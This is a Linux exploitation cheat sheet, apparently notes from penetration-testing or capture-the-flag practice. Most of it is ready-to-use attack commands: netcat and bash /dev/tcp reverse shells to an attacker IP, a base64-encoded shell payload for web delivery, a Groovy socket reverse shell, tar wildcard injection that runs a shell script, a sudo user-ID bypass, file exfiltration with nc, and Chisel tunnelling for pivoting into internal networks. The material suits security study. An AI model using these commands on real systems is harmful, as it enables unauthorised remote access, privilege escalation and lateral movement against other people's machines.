# Linux Exploitation

## Enumerate Linux Machine
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite): 
    * `./linpeas.sh | tee enum.txt` 
    * `less -r enum.txt`

## Find Interesting Files
* Find File With uuid Permission
    * `find / -perm /u=s 2>/dev/null`
    * `find / -perm /4000 2>/dev/null`
* Files With Capabilities
    * `getcap -r / 2>/dev/null`


## Generate reverse ncat
* `msfvenom -p cmd/unix/reverse_netcat lhost=10.13.3.36 lport=4444`
    * `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`
* Bash Reverse Shell
    * `bash -c 'bash -i >& /dev/tcp/10.13.3.36/4444 0>&1'`
    * Create one to send on the web
```bash
$ echo 'bash -i >& /dev/tcp/localhost/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC9sb2NhbGhvc3QvNDQ0NCAwPiYxCg==

# Add spaces to remove the + and =

$ echo 'bash  -i >& /dev/tcp/localhost/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvbG9jYWxob3N0LzQ0NDQgMD4mMSAK

# Send this as the payload
$ echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvbG9jYWxob3N0LzQ0NDQgMD4mMSAK | base64 -d | bash
```
* Listener: `nc -klvnp 4444`
    * k - Wait for more connections after completion
    * l - Listen for connection
    * v - Verbose
    * n - Don't do DNS lookup
    * p - Port to listen to

## Reverse Shells

### PHP Reverse Shells
* phpbash (webshell): https://github.com/Arrexel/phpbash
* php-reverse-shell.php : https://github.com/pentestmonkey/php-reverse-shell
* #!/usr/bin/env php

### Groovy Reverse Shell
```groovy
String host="10.13.3.36";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Stabilisation of Shell
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
```
CTRL-z
```sh
stty raw -echo;fg
```

If the number of rows and column don't match. 

On your machine:
```bash
 stty -a
speed 38400 baud; rows 53; columns 211; line = 0;
```

Then in the reverse shell:
```bash
stty rows 53 cols 211
```

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/


## sudo
* List sudo Permisions
    * `sudo -l`
* Abuse sudo with (ALL, !root)
    * `sudo -u#-1`

## Abuse tar With Wildcard *
```sh
echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

## Using nc To Transfer Files

On the receiving machine
```bash
nc -l -p 1234 > file
```
On the sending machine, open the connection and send the file.

```bash
nc -w 3 10.13.3.36 1234 < file
```

## Scan for Open Ports With nc
```bash
import os

for i in range(65535):
        command = f"nc -v -z -n -w 1 172.17.0.1 {i}"
        os.system(command)
```

## Interesting LFI Files

* /etc/passwd - Get the users on the system
* /proc/self/ - Information of the current process, replace self with PID to get other processes
    * /proc/self/cmdline - Command line
    * /proc/self/environ - Environment variables
    * /proc/self/stat - Information of the process, PID, Parrent PID

## Create Tunnel with Chisel

Useful when you have a reverse shell and want to tunnel some traffic without a SSH connection.

Download [Chisel](https://github.com/jpillora/chisel).

### Create a tunnel

Create the reverse server in your machine on port 3477.

```bash
$ ./chisel server -p 3477 --reverse
022/09/09 09:35:29 server: Reverse tunnelling enabled
2022/09/09 09:35:29 server: Fingerprint dzD/Qptfc30MSxvgsDGogRBXv2AcwIQJD2C2S/tsmRM=
2022/09/09 09:35:29 server: Listening on http://0.0.0.0:3477
```

Launched the client in the target machine. This connect to the server on port 3477 and create a tunnel. Any traffic on port 2222 on your machine will be tunneled to the target machine and send to 172.19.0.1 on port 80.

```bash
$ ./chisel client 10.10.14.143:3477 R:2222:172.19.0.1:80/tcp
2022/09/09 13:39:57 client: Connecting to ws://10.10.14.143:3477
2022/09/09 13:39:57 client: Connected (Latency 25.96244ms)
```

Open your browser on http://localhost:2222/ and you will see the site on 172.19.0.1:80.

### Dynamic tunneling

Create the server on your machine.

```bash
$ ./chisel server -p 9312 --reverse 
2022/09/09 10:28:25 server: Reverse tunnelling enabled
2022/09/09 10:28:25 server: Fingerprint fW9TjgADygUXnU2VPbt6aR3Tq0njW7wTa9/MpN8acm0=
2022/09/09 10:28:25 server: Listening on http://0.0.0.0:9312
```

Lauch the client on the target machine, creating a reverse socks tunnel

```bash
$ ./chisel client 10.10.14.143:9312 R:socks
2022/09/09 14:29:49 client: Connecting to ws://10.10.14.143:9312
2022/09/09 14:29:49 client: Connected (Latency 25.930019ms)
```

You should get a connection on your server.

```bash
2022/09/09 10:29:48 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Configure proxychains to for socks5 on port 1080.

> /etc/proxychains4.conf
```
socks5  127.0.0.1 1080
```

Use proxychains to run commands on the target from your machine.

```bash
$ proxychains nmap 172.19.0.1 2>/dev/null
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 10:33 EDT
Nmap scan report for  (172.19.0.1)
Host is up (0.078s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 79.48 seconds
```
